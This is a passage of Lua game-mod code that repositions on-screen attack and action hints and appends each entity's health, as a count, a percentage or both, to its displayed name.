				if math.abs(p_r - a_l) < math.abs(p_l - a_r) then
					local d = (p_r - a_l) + 20
					self.attackhint:SetScreenOffset(d/2,0)
					self.playeractionhint:SetScreenOffset(-d/2,0)
				else
					local d = (a_r - p_l) + 20
					self.attackhint:SetScreenOffset( -d/2,0)
					self.playeractionhint:SetScreenOffset(d/2,0)
				end
			end
		end

		self:HighlightActionItem(shownItemIndex, itemInActions)
    end
end)
end

AddPrefabPostInitAny(function(inst)
	if inst.components.healthinfo == nil then
		inst:AddComponent("healthinfo")
		if inst.components.health then
			str = ""
			local h=inst.components.health
			local mx=math.floor(h.maxhealth-h.minhealth)
			local cur=math.floor(h.currenthealth-h.minhealth)

			-- str = "["..cur.." / "..mx .."]"--.. " ("..math.floor(cur*100/mx).."%%)"

			if show_type == 0 then
				str = "["..cur.." / "..mx .."]"
			elseif show_type == 1 then
				str = "["..math.floor(cur*100/mx).."%]"
			else
				str = "["..cur.." / "..mx .." "..math.floor(cur*100/mx).."%]"
			end
			inst.components.healthinfo:SetText(str)
		end
	end
end)

if show_mode == 1 then
AddGlobalClassPostConstruct('entityscript', 'EntityScript', function(self)
	local original_GetDisplayName = self.GetDisplayName
	self.GetDisplayName = function(self)
		local name = ""
		if self then
			name = original_GetDisplayName(self)
			if self.components and self.components.healthinfo and self.components.healthinfo.text ~= '' then
				name = name .. " " .. self.components.healthinfo.text
			end
		end
		return name
	end
end)
end

end --end of Health Info




